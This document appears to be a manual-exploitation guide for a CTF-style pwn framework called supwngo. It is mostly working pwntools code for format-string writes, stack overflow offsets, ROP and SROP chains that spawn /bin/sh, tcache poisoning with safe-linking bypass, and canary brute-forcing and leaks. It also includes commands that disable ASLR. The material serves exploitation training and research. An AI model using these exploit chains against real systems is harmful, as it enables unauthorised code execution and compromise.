# Manual Exploitation Guide

When supwngo's automatic exploitation doesn't fully work, use this guide to complete exploits manually using supwngo's components.

## Table of Contents

1. [Format String Calibration](#format-string-calibration)
2. [Stack Buffer Overflow Offset Finding](#stack-buffer-overflow-offset-finding)
3. [ret2csu on Modern glibc](#ret2csu-on-modern-glibc)
4. [ROP Chain Building](#rop-chain-building)
5. [Heap Exploitation](#heap-exploitation)
6. [SROP Manual Setup](#srop-manual-setup)
7. [Canary Bypass](#canary-bypass)

---

## Format String Calibration

### Problem
Format string offset varies per binary. supwngo defaults to offset 6, but the actual offset depends on stack layout.

### Finding the Correct Offset

```python
from pwn import *

def find_fmt_offset(binary_path, prompt=b": "):
    """Find format string offset by looking for our marker."""
    for i in range(1, 20):
        p = process(binary_path)
        p.recvuntil(prompt)

        # Send marker + format string
        marker = b"AAAAAAAA"
        payload = marker + f".%{i}$p".encode()
        p.sendline(payload)

        output = p.recvall(timeout=1)
        p.close()

        # Check if we see our marker as hex (0x4141414141414141)
        if b"0x4141414141414141" in output:
            print(f"[+] Found offset: {i}")
            return i

    return None

# Usage
offset = find_fmt_offset("./format_string")
```

### Manual Format String Exploit

```python
from pwn import *
import sys
sys.path.insert(0, '/path/to/supwngo')

from supwngo.exploit.format_string import FormatStringExploiter

# 1. Find offset first
offset = 6  # Or use find_fmt_offset()

# 2. Create exploiter with correct offset
exploiter = FormatStringExploiter(bits=64, offset=offset)

# 3. For reading values
leak_payload = exploiter.leak_address(target_addr)

# 4. For writing values - may need alignment adjustment
write_payload = exploiter.write_value(target_addr, value)

# 5. If payload doesn't work, try manual construction:
def manual_fmt_write(addr, value, offset):
    """
    Manual format string write for when auto fails.
    Writes one byte at a time using %hhn.
    """
    payload = b""
    written = 0

    # Build format string part first
    fmt_parts = []
    for i in range(8):  # 8 bytes for 64-bit
        byte_val = (value >> (i * 8)) & 0xff
        target = addr + i

        # Calculate padding needed
        to_write = (byte_val - written) % 256
        if to_write == 0:
            to_write = 256

        fmt_parts.append(f"%{to_write}c%{offset + i}$hhn")
        written = byte_val

    # Pad to align addresses
    fmt_str = "".join(fmt_parts).encode()
    padding = (8 - (len(fmt_str) % 8)) % 8
    fmt_str += b"X" * padding

    # Add addresses
    for i in range(8):
        fmt_str += p64(addr + i)

    return fmt_str

# 6. Test with binary
p = process("./format_string")
p.recvuntil(b": ")
p.sendline(write_payload)
print(p.recvall())
```

### Debugging Format Strings

```bash
# Check what's on the stack
echo 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./binary

# Look for 0x4141414141414141 to find your offset
# The position where you see it is your offset
```

---

## Stack Buffer Overflow Offset Finding

### Problem
Buffer-to-target offset varies based on compiler, optimization, and stack layout.

### Method 1: GDB Analysis

```bash
# Disassemble to find buffer and target locations
gdb -batch -ex "disass main" ./binary

# Look for:
# - sub $0xXX,%rsp  (stack frame size)
# - mov $value,-0xYY(%rbp)  (variable locations)
# - lea -0xZZ(%rbp),%rax  (buffer location)

# Offset = buffer_offset - target_offset
# Example: buffer at rbp-0x50, target at rbp-0x4
# Offset = 0x50 - 0x04 = 0x4c = 76 bytes
```

### Method 2: Cyclic Pattern

```python
from pwn import *

# Generate pattern
pattern = cyclic(200)

# Run binary, send pattern
p = process("./binary")
p.sendline(pattern)
p.wait()

# Check core dump or use GDB
# gdb ./binary core
# x/wx $rbp-0x4  # Check overwritten value

# Find offset
offset = cyclic_find(0x61616166)  # Value found at target
print(f"Offset: {offset}")
```

### Method 3: Binary Search

```python
from pwn import *

def test_offset(binary, offset, target_value):
    p = process(binary)
    p.recvuntil(b": ")
    payload = b"A" * offset + p32(target_value)
    p.sendline(payload)
    output = p.recvall(timeout=1)
    p.close()
    return b"win" in output.lower() or b"flag" in output.lower()

# Binary search for correct offset
for offset in range(60, 100):
    if test_offset("./simple_bof", offset, 0xcafebabe):
        print(f"[+] Found offset: {offset}")
        break
```

---

## ret2csu on Modern glibc

### Problem
glibc 2.34+ removed `__libc_csu_init`, making ret2csu unavailable.

### Alternative 1: Use Available Gadgets

```python
from supwngo.core.binary import Binary
from supwngo.exploit.rop.gadgets import GadgetFinder

binary = Binary("./binary")
finder = GadgetFinder(binary)

# Find what's available
ret = finder.find_ret()
pop_rdi = finder.find_pop_reg("rdi")
pop_rsi = finder.find_pop_reg("rsi")
pop_rdx = finder.find_pop_reg("rdx")

# Build chain with available gadgets
chain = b""
if pop_rdi:
    chain += p64(pop_rdi.address)
    chain += p64(arg1)
# ... etc
```

### Alternative 2: ret2dlresolve

```python
from supwngo.exploit.rop.techniques import ROPTechniques
from supwngo.core.binary import Binary

binary = Binary("./binary")

# ret2dlresolve doesn't need libc gadgets
# It abuses the dynamic linker to call any function

# Check if available
techniques = ROPTechniques(binary)
if techniques.can_ret2dlresolve():
    chain = techniques.build_ret2dlresolve("system", ["/bin/sh"])
```

### Alternative 3: SROP (if syscall gadget exists)

```python
from supwngo.exploit.rop.techniques import ROPTechniques

# SROP only needs: syscall gadget + sigreturn gadget
# Or just syscall if you can set rax=15

techniques = ROPTechniques(binary)
syscall = techniques.find_syscall()

if syscall:
    # Build SROP frame for execve
    frame = techniques._build_sigreturn_frame(
        rax=59,           # execve syscall number
        rdi=binsh_addr,   # pointer to "/bin/sh"
        rsi=0,            # NULL
        rdx=0,            # NULL
        rip=syscall.address
    )
```

### Alternative 4: One-gadget (with libc leak)

```bash
# Find one-gadget in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Use with libc base
libc_base = leaked_addr - known_offset
one_gadget_addr = libc_base + one_gadget_offset
```

---

## ROP Chain Building

### When Automatic Chain Building Fails

```python
from supwngo.core.binary import Binary
from supwngo.exploit.rop.gadgets import GadgetFinder
from pwn import *

binary = Binary("./binary")
elf = ELF("./binary")
finder = GadgetFinder(binary)

# Step 1: Inventory available gadgets
print("Available gadgets:")
for reg in ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]:
    g = finder.find_pop_reg(reg)
    if g:
        print(f"  pop {reg}: {hex(g.address)}")

ret = finder.find_ret()
print(f"  ret: {hex(ret.address) if ret else 'not found'}")

# Step 2: Manual chain construction
chain = b""

# Stack alignment (needed for system() on modern glibc)
if ret:
    chain += p64(ret.address)

# Set up arguments
pop_rdi = finder.find_pop_reg("rdi")
if pop_rdi:
    chain += p64(pop_rdi.address)
    chain += p64(elf.symbols['binsh'])  # or wherever /bin/sh is

# Call function
chain += p64(elf.plt['system'])

# Step 3: If missing gadgets, look in binary sections
from capstone import *

# Search .text section for gadgets
text = binary.get_section('.text')
md = Cs(CS_ARCH_X86, CS_MODE_64)

for i in range(len(text.data) - 3):
    # Look for "pop rdi; ret" = 0x5f 0xc3
    if text.data[i:i+2] == b'\x5f\xc3':
        addr = text.address + i
        print(f"Found pop rdi; ret at {hex(addr)}")
```

### Using ROPgadget/Ropper Directly

```bash
# If supwngo gadget finder misses something
ROPgadget --binary ./binary --ropchain

# Or with ropper
ropper --file ./binary --search "pop rdi"
```

---

## Heap Exploitation

### Tcache Poisoning with Safe-Linking

```python
from supwngo.exploit.heap import TcacheExploiter, SafeLinkingBypass

# Determine glibc version
exploiter = TcacheExploiter(libc_version="2.35")

if exploiter.has_safe_linking:
    # Need to encrypt the target pointer

    # 1. Leak heap address (for the chunk that will hold our fake pointer)
    heap_leak = 0x555555559000  # From some leak
    chunk_addr = heap_leak + 0x10  # Adjust to your chunk

    # 2. Encrypt target
    target = 0x404040  # Where we want to allocate
    encrypted = SafeLinkingBypass.encrypt(target, chunk_addr)

    # 3. Write encrypted pointer to freed chunk's fd
    # This depends on your primitive (UAF, overflow, etc.)

    # 4. Allocate twice to get chunk at target
    # malloc() -> returns old chunk
    # malloc() -> returns target!

else:
    # Old glibc, just write target directly to fd
    pass
```

### House of Force (Old glibc)

```python
from supwngo.exploit.heap import HeapExploiter

exploiter = HeapExploiter(binary)

# Requires: heap overflow into top chunk size
# 1. Overflow top chunk size to -1 (0xffffffffffffffff)
# 2. Calculate distance to target
# 3. malloc(distance) - moves top chunk
# 4. Next malloc returns target

distance = target_addr - top_chunk_addr - 0x20
# malloc(distance)
# malloc(0x20) -> at target
```

### Tcache Struct Poisoning

```python
from supwngo.exploit.heap import TcachePerThreadStruct

# If you can write to tcache_perthread_struct
perthread = TcachePerThreadStruct(version="2.31")

# Create fake struct with target in a bin
fake_struct = perthread.build_fake_struct(
    target_bin_idx=0,      # 0x20 size bin
    target_ptr=0x404040,   # Where to allocate
    target_count=1         # How many "chunks" available
)

# Write fake_struct to tcache_perthread location
# Then malloc(0x18) returns 0x404040
```

---

## SROP Manual Setup

### Building the Sigreturn Frame

```python
from supwngo.exploit.rop.techniques import ROPTechniques
from pwn import *

# Method 1: Using supwngo
techniques = ROPTechniques.__new__(ROPTechniques)
techniques.bits = 64
techniques.pack = lambda x: p64(x)

# For mprotect + shellcode
frame = techniques._build_sigreturn_frame(
    rax=10,           # mprotect
    rdi=0x400000,     # page address
    rsi=0x1000,       # size
    rdx=7,            # PROT_READ|WRITE|EXEC
    rsp=shellcode_addr,  # New stack pointer
    rip=syscall_addr     # Where to return
)

# Method 2: Using pwntools directly
frame = SigreturnFrame()
frame.rax = 59         # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = bytes(frame)
```

### Finding Sigreturn Gadget

```python
# Option 1: Direct syscall with rax=15
# Need: pop rax; ret  OR  xor rax,rax; ... ; add rax,15; ...

# Option 2: Call to rt_sigreturn in vsyscall/vdso
# Check with: readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep sigreturn

# Option 3: In statically linked binaries
# grep -ao $'\x0f\x05' binary | wc -l  # Count syscall instructions
```

### Complete SROP Exploit

```python
from pwn import *

# Setup
p = process("./srop_binary")
elf = ELF("./srop_binary")

# Find gadgets (example addresses)
syscall_ret = 0x401234
pop_rax = 0x401235

# Stage 1: Trigger sigreturn
payload = b"A" * offset
payload += p64(pop_rax)
payload += p64(15)         # rt_sigreturn syscall number
payload += p64(syscall_ret)

# Stage 2: Sigreturn frame for execve
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = next(elf.search(b"/bin/sh\x00"))  # Or write it yourself
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

---

## Canary Bypass

### Method 1: scanf %lf Bypass

When binary uses `scanf("%lf", &var)`, you can skip the canary:

```python
from supwngo.exploit.canary_bypass import addr_to_double, ScanfBypassExploit

# Create exploit config
exploit = ScanfBypassExploit(
    binary_path="./canary_binary",
    buffer_size=32,
    canary_index=4,    # Which double index is the canary
    rbp_index=5,       # Which double index is saved RBP
    rip_index=6,       # Which double index is return address
    skip_char="."      # Character that makes scanf skip (keeps original value)
)

# Build payload
# For items you want to skip (like canary), use skip_char
# For items you want to overwrite, use addr_to_double()

doubles = []
for i in range(exploit.rip_index + 1):
    if i == exploit.canary_index or i == exploit.rbp_index:
        doubles.append(".")  # Skip - preserve original
    elif i == exploit.rip_index:
        doubles.append(addr_to_double(win_addr))
    else:
        doubles.append("0.0")

payload = " ".join(doubles)
```

### Method 2: Canary Leak

```python
# Via format string
p.sendline(b"%p " * 20)
output = p.recvline()
# Parse output, find canary (usually ends in 00)

# Via byte-by-byte brute force (if process forks)
def leak_canary_byte(known_bytes, byte_pos):
    for b in range(256):
        p = process("./binary")
        payload = b"A" * buffer_size + known_bytes + bytes([b])
        p.send(payload)

        # If no crash, this byte is correct
        try:
            p.recvline(timeout=0.1)
            p.close()
            return b
        except:
            p.close()
            continue
    return None

# Canary is 8 bytes, first byte is always 0x00
canary = b"\x00"
for i in range(7):
    canary += bytes([leak_canary_byte(canary, i+1)])
```

### Method 3: Stack Clash / Thread Spraying

```python
# If binary is multi-threaded, threads share canary
# Leak from one thread, use in another

# Or exploit stack clash to read canary from adjacent stack
```

---

## General Debugging Tips

### 1. Enable Core Dumps

```bash
ulimit -c unlimited
echo "/tmp/core.%p" | sudo tee /proc/sys/kernel/core_pattern
```

### 2. Run with GDB

```bash
# Attach to running process
gdb -p $(pgrep binary)

# Run with script
gdb -x exploit.gdb ./binary
```

### 3. Use strace/ltrace

```bash
# See system calls
strace ./binary

# See library calls
ltrace ./binary
```

### 4. Check Security

```bash
# Verify protections
checksec ./binary

# Check ASLR
cat /proc/sys/kernel/randomize_va_space
# 0 = off, 1 = partial, 2 = full

# Disable for testing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### 5. pwntools Debug Mode

```python
from pwn import *

context.log_level = 'debug'  # See all I/O
context.terminal = ['tmux', 'splitw', '-h']  # For GDB

p = gdb.debug("./binary", '''
    break main
    continue
''')
```

---

## Quick Reference

| Scenario | Solution |
|----------|----------|
| Format string offset wrong | Use `find_fmt_offset()` function |
| Buffer overflow offset unknown | Use cyclic pattern or GDB disasm |
| ret2csu unavailable | Use ret2dlresolve, SROP, or one-gadget |
| Missing pop gadgets | Search binary manually with capstone |
| Safe-linking enabled | Use `SafeLinkingBypass.encrypt()` |
| Canary present | Leak via fmt string, brute force, or scanf bypass |
| ASLR enabled | Leak addresses first, calculate bases |
| No syscall gadget | Use ret2libc instead of SROP |
